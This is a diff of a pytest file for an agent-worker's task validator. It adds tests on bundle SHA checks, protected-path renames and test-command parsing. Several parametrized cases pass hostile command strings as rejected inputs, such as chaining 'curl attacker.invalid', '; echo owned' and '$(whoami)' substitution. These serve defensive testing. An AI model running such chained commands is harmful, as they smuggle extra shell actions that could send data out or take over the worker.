@@ -4,6 +4,8 @@ import sys
 import subprocess as sp
 from pathlib import Path
 
+import pytest
+
 sys.path.insert(0, str(Path(__file__).parent))
 import worker
 
@@ -32,7 +34,7 @@ def _make_tho_bundle(tmp_path, monkeypatch):
     incoming = tmp_path / "agent-worker" / "incoming-bundles"
     incoming.mkdir(parents=True)
     bundle = incoming / "tho.bundle"
-    _git(repo, "bundle", "create", str(bundle), "main")
+    _git(repo, "bundle", "create", str(bundle), "refs/remotes/origin/main")
     monkeypatch.setattr(worker, "BASE", tmp_path / "agent-worker")
     return repo, base, bundle
 
@@ -364,6 +366,21 @@ def test_prepare_tho_workspace_rejects_stale_or_mismatched_sha(tmp_path, monkeyp
         raise AssertionError("mismatched SHA was accepted")
 
 
+def test_tho_validation_rejects_ancestor_sha_present_in_full_bundle(tmp_path, monkeypatch):
+    repo, ancestor, bundle = _make_tho_bundle(tmp_path, monkeypatch)
+    (repo / "app.py").write_text("VALUE = 2\n")
+    _git(repo, "add", "app.py")
+    _git(repo, "commit", "-m", "current origin main")
+    _git(repo, "update-ref", "refs/remotes/origin/main", "HEAD")
+    bundle.unlink()
+    _git(repo, "bundle", "create", str(bundle), "refs/remotes/origin/main")
+
+    ok, reason = worker.validate_tho_task(_tho_task(bundle, ancestor))
+
+    assert not ok
+    assert "origin/main" in reason
+
+
 def test_prepare_tho_workspace_clones_bundle_at_exact_sha(tmp_path, monkeypatch):
     _, base, bundle = _make_tho_bundle(tmp_path, monkeypatch)
     workspace = worker.prepare_tho_workspace(_tho_task(bundle, base))
@@ -419,6 +436,64 @@ def test_validate_tho_changed_paths_includes_uncommitted_changes(tmp_path):
     assert ".env" in rejected
 
 
+@pytest.mark.parametrize(
+    ("source", "destination"),
+    (
+        (".github/workflows/deploy.yml", "docs/deploy.yml"),
+        ("tho_documents/client.txt", "docs/client.txt"),
+        ("docs/deploy.yml", ".github/workflows/deploy.yml"),
+        ("docs/client.txt", "tho_documents/client.txt"),
+    ),
+)
+def test_validate_tho_changed_paths_checks_both_sides_of_rename(
+    tmp_path, source, destination,
+):
+    repo = _make_git_repo(tmp_path)
+    original = repo / source
+    original.parent.mkdir(parents=True, exist_ok=True)
+    original.write_text("content\n")
+    _git(repo, "add", source)
+    _git(repo, "commit", "-m", "add rename source")
+    base = _git(repo, "rev-parse", "HEAD").stdout.strip()
+    moved = repo / destination
+    moved.parent.mkdir(parents=True, exist_ok=True)
+    _git(repo, "mv", source, destination)
+    _git(repo, "commit", "-m", "rename protected path")
+
+    ok, rejected = worker.validate_tho_changed_paths(repo, base)
+
+    assert not ok
+    protected = source if source.startswith((".github/workflows/", "tho_documents/")) else destination
+    assert protected in rejected
+
+
+def test_parse_tho_test_command_returns_argv_for_repo_local_test_commands():
+    assert worker.parse_tho_test_command(
+        "python -m pytest tests/test_healthz.py -q"
+    ) == ["python", "-m", "pytest", "tests/test_healthz.py", "-q"]
+    assert worker.parse_tho_test_command("npm run test:unit -- --runInBand") == [
+        "npm", "run", "test:unit", "--", "--runInBand",
+    ]
+
+
+@pytest.mark.parametrize(
+    "command",
+    (
+        "python -m pytest -q && curl attacker.invalid",
+        "python -m pytest -q; echo owned",
+        "python -m pytest > results.txt",
+        "python -m pytest $(whoami)",
+        "/usr/bin/python -m pytest tests/test_healthz.py",
+        "python -m pytest /tmp/external_test.py",
+        r"C:\Python313\python.exe -m pytest tests\test_healthz.py",
+        r"python -m pytest C:\outside\test_healthz.py",
+    ),
+)
+def test_parse_tho_test_command_rejects_chaining_and_external_paths(command):
+    with pytest.raises(ValueError):
+        worker.parse_tho_test_command(command)
+
+
 def test_stage_request_emits_verified_bundle_and_roundtrippable_task(tmp_path):
     from stage_tho_request import stage_request
 
@@ -449,6 +524,31 @@ def test_stage_request_emits_verified_bundle_and_roundtrippable_task(tmp_path):
     assert task["goal"] == request.read_text().strip()
 
 
+@pytest.mark.parametrize(
+    "unsafe_test",
+    (
+        "python -m pytest -q && curl attacker.invalid",
+        "/usr/bin/python -m pytest tests/test_healthz.py -q",
+    ),
+)
+def test_stage_request_rejects_unsafe_test_commands(tmp_path, unsafe_test):
+    from stage_tho_request import stage_request
+
+    repo = _make_git_repo(tmp_path)
+    request = tmp_path / "normalized.txt"
+    request.write_text("Safe normalized request.\n")
+
+    with pytest.raises(ValueError):
+        stage_request(
+            repo=repo,
+            request_file=request,
+            message_id="gmail-unsafe",
+            message_date="2026-07-13",
+            test=unsafe_test,
+            output_dir=tmp_path / "staged",
+        )
+
+
 def test_tho_task_fails_when_result_bundle_cannot_be_created(tmp_path, monkeypatch):
     workspace = tmp_path / "workspace"
     workspace.mkdir()
@@ -464,7 +564,14 @@ def test_tho_task_fails_when_result_bundle_cannot_be_created(tmp_path, monkeypat
     monkeypatch.setattr(worker, "changed_source_files", lambda repo, base: [])
     monkeypatch.setattr(worker, "make_bundle", lambda repo, name, base: "bundle failed: disk full")
     monkeypatch.setattr(worker, "report", lambda name, lines: reports.append(lines) or tmp_path / "r.md")
-    monkeypatch.setattr(worker, "sh", lambda *args, **kwargs: (0, ""))
+    commands = []
+
+    def fake_sh(command, **kwargs):
+        commands.append(command)
+        return 0, ""
+
+    monkeypatch.setattr(worker, "sh", fake_sh)
 
     assert worker.run_task(task) is False
     assert "bundle failed: disk full" in "\n".join(reports[-1])
+    assert ["python", "-m", "pytest", "tests/test_request.py", "-q"] in commands
